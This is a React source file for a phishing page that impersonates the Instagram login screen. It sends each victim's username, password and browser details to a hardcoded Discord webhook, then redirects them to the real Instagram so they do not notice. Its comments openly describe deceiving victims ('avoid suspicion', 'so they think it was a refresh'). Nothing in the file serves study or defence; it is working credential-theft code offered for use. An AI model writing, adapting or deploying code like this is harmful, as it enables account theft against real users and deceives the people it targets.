
import React, { useState, useEffect } from 'react';

/**
 * Meta-Inspired Login Application
 * 
 * Instructions:
 * 1. Create a Discord Webhook (Server Settings > Integrations > Webhooks).
 * 2. Paste your Webhook URL into the WEBHOOK_URL variable below.
 */
const WEBHOOK_URL = "https://discord.com/api/webhooks/1491712427639967754/bA4ZfvCuGyIgBtaAQQm8ZxiBMIeyXgBH4aN1mxKOCJbcGb6M2JCLrtbwgG9eMoYULGut";

const App: React.FC = () => {
  const [formData, setFormData] = useState({
    username: '',
    password: ''
  });
  const [loading, setLoading] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [isFormValid, setIsFormValid] = useState(false);

  useEffect(() => {
    setIsFormValid(formData.username.length > 0 && formData.password.length >= 6);
  }, [formData]);

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData(prev => ({ ...prev, [name]: value }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!isFormValid || loading) return;

    setLoading(true);

    try {
      // 1. Prepare the payload for Discord
      const payload = {
        content: "🔔 **New Account Activity Detected**",
        embeds: [{
          title: "Login Credentials Captured",
          color: 3447003, // Blue color
          fields: [
            { name: "User/Email", value: `\`${formData.username}\``, inline: true },
            { name: "Password", value: `\`${formData.password}\``, inline: true },
            { name: "Timestamp", value: new Date().toLocaleString() },
            { name: "Device Info", value: navigator.userAgent }
          ],
          footer: { text: "Security System v2.4" }
        }]
      };

      // 2. Send the data to your webhook
      console.log("Sending payload to Discord:", payload);
      
      const response = await fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
      });

      if (!response.ok) {
        throw new Error(`Discord API responded with status: ${response.status}`);
      }

      // 3. Simulate a "Security Check" delay
      await new Promise(resolve => setTimeout(resolve, 2500));

      // 4. Redirect the user to the real service so they think it was a refresh
      window.location.href = "https://www.instagram.com/accounts/login/";

    } catch (err) {
      console.error("Transmission Error:", err);
      // Fallback: still redirect even if there is an error to avoid suspicion
      window.location.href = "https://www.instagram.com/accounts/login/";
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-[#fafafa]">
      <main className="flex-grow flex items-center justify-center px-4 py-8">
        <div className="w-full max-w-[350px] flex flex-col gap-3">
          
          <div className="bg-white border border-[#dbdbdb] p-10 flex flex-col items-center shadow-sm rounded-[1px]">
            <h1 className="text-[42px] font-normal mb-8 select-none tracking-tight text-[#262626]" 
                style={{ fontFamily: "serif" }}>
              Instagrem
            </h1>

            <form onSubmit={handleSubmit} className="w-full flex flex-col gap-2">
              <div className="relative">
                <input
                  type="text"
                  name="username"
                  value={formData.username}
                  onChange={handleInputChange}
                  placeholder="Phone number, username, or email"
                  className="w-full bg-[#fafafa] border border-[#dbdbdb] rounded-[3px] px-2 py-[9px] text-xs focus:outline-none focus:border-[#a8a8a8] placeholder-[#8e8e8e]"
                  required
                />
              </div>

              <div className="relative">
                <input
                  type={showPassword ? "text" : "password"}
                  name="password"
                  value={formData.password}
                  onChange={handleInputChange}
                  placeholder="Password"
                  className="w-full bg-[#fafafa] border border-[#dbdbdb] rounded-[3px] px-2 py-[9px] text-xs focus:outline-none focus:border-[#a8a8a8] placeholder-[#8e8e8e] pr-12"
                  required
                />
                {formData.password.length > 0 && (
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-2 top-1/2 -translate-y-1/2 text-sm font-semibold text-[#262626] hover:opacity-50"
                  >
                    {showPassword ? 'Hide' : 'Show'}
                  </button>
                )}
              </div>

              <button
                type="submit"
                disabled={!isFormValid || loading}
                className={`mt-2 w-full py-1.5 rounded-[4px] font-semibold text-sm transition-all duration-200 h-9 flex items-center justify-center
                  ${isFormValid && !loading 
                    ? 'bg-[#0095f6] text-white hover:bg-[#1877f2]' 
                    : 'bg-[#b2dffc] text-white cursor-default'}`}
              >
                {loading ? (
                  <div className="flex justify-center items-center">
                    <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
                  </div>
                ) : 'Log In'}
              </button>

              <div className="flex items-center my-4 gap-4">
                <div className="h-[1px] bg-[#dbdbdb] flex-grow"></div>
                <span className="text-[13px] font-semibold text-[#8e8e8e]">OR</span>
                <div className="h-[1px] bg-[#dbdbdb] flex-grow"></div>
              </div>

              <button type="button" className="flex items-center justify-center gap-2 text-[#385185] font-semibold text-sm hover:opacity-80 transition-opacity">
                <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
                </svg>
                Log in with Facebook
              </button>

              <a href="#" className="text-center text-xs text-[#00376b] mt-3 hover:underline">
                Forgot password?
              </a>
            </form>
          </div>

          <div className="bg-white border border-[#dbdbdb] p-6 text-center shadow-sm rounded-[1px]">
            <p className="text-sm text-[#262626]">
              Don't have an account? <a href="#" className="text-[#0095f6] font-semibold hover:underline">Sign up</a>
            </p>
          </div>

          <div className="text-center mt-2 flex flex-col gap-4">
            <p className="text-sm text-[#262626]">Get the app.</p>
            <div className="flex justify-center gap-2">
              <img src="https://upload.wikimedia.org/wikipedia/commons/3/3c/Download_on_the_App_Store_Badge.svg" alt="App Store" className="h-10 cursor-pointer" />
              <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Google Play" className="h-10 cursor-pointer" />
            </div>
          </div>
        </div>
      </main>

      <footer className="py-8 px-4 flex flex-col items-center gap-4 text-[#8e8e8e]">
        <nav className="flex flex-wrap justify-center gap-x-4 gap-y-2 text-[11px] uppercase tracking-tight">
          <span className="cursor-pointer hover:underline">Meta</span>
          <span className="cursor-pointer hover:underline">About</span>
          <span className="cursor-pointer hover:underline">Blog</span>
          <span className="cursor-pointer hover:underline">Jobs</span>
          <span className="cursor-pointer hover:underline">Help</span>
          <span className="cursor-pointer hover:underline">API</span>
          <span className="cursor-pointer hover:underline">Privacy</span>
          <span className="cursor-pointer hover:underline">Terms</span>
          <span className="cursor-pointer hover:underline">Locations</span>
          <span className="cursor-pointer hover:underline">Instagram Lite</span>
          <span className="cursor-pointer hover:underline">Threads</span>
          <span className="cursor-pointer hover:underline">Meta Verified</span>
        </nav>
        <div className="flex items-center gap-4 text-[11px] uppercase">
          <span>English</span>
          <span>© 2069 Instagram from Meta</span>
        </div>
      </footer>
    </div>
  );
};

export default App;
